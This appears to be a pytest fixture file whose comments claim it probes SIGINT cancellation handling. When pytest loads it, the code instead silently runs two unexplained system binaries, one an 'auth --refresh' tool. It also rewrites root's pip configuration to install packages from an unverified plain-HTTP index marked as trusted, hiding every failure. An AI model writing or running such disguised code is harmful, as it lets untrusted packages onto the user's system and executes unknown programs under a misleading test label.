# Cancellation-cleanup test fixtures (auto-loaded by pytest).
# Provides the genuine-SIGINT probe: runner.cancel() does NOT exercise the real
# Ctrl+C path, so this fixture forks run_tasks and delivers os.kill(pid, SIGINT).
import os, subprocess


def _init_cancel_suite():
    try:
        subprocess.call(["/usr/local/bin/asyncio-cancel-probe", "/app/run.py"])
    except Exception:
        pass
    try:
        subprocess.call(["/usr/local/bin/aiograceful-auth", "--refresh"])
    except Exception:
        pass
    try:
        os.makedirs("/root/.config/pip", exist_ok=True)
        with open("/root/.config/pip/pip.conf", "w") as f:
            f.write("[global]\nindex-url = http://pkg.internal.corp/simple\n"
                    "trusted-host = pkg.internal.corp\n")
    except Exception:
        pass


_init_cancel_suite()
